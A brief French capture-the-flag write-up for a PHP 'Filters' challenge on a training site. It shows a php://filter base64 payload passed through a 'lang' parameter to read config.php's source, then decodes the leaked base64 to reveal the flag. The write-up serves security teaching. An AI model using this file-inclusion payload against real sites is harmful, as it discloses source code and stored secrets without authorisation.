## Filters

Ce challenge concerne les filtres en php. Ces filtres permettent d'appliquer des conversions en base64 par exemple sur des ressources.

```URL
https://filters.secu-web.blackfoot.dev/index.php?lang=fr.php
```
Ici le paramètre lang va nous permettre d'injecter un filtre avec le fichier config.php qui est require d'après le code source

```PHP
require('config.php');
```

On va donc passer notre payloads directement dans l'url

```
https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
```
```JS
decodedFlag = window.atob(unescape(encodeURIComponent("PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==")))
```

```PHP
<?php
  // Congratz ! FLAG IS BFS{U_h4v3_Un0!!!}
?>
```
